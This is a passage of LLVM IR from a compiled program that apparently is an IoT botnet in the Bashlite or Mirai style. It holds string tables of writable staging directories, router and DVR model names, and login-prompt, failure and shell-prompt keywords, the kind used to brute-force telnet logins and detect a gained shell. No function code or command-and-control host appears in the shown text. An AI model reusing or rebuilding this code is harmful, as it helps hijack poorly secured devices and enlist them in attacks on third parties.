([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.416, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.419, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.421, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.425, i32 0, i32 0)], align 16
@.str.426 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.427 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.428 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.429 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.430 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.432 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.433 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.434 = private unnamed_addr constant [8 x i8] c"/boot/*\00", align 1
@.str.435 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.436 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@Temp_Directorys = dso_local global [13 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.436, i32 0, i32 0), i8* null], align 16
@.str.437 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.438 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.439 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.440 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.441 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.442 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.443 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.444 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.445 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.446 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.447 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.448 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.449 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.450 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@advances = dso_local global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.450, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* null], align 16
@.str.452 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.453 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.454 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.455 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.456 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.457 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.458 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.459 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.460 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.461 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@fails = dso_local global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.461, i32 0, i32 0), i8* null], align 16
@.str.462 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.463 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.464 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.465 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.466 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.467 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.468 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.469 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@successes = dso_local global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.465, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* null], align 16
@advances2 = dso_local global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.463, i32 0, i32 0), i8* null], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.471 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@pids = dso_local global i32* null, align 8
@.str.472 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
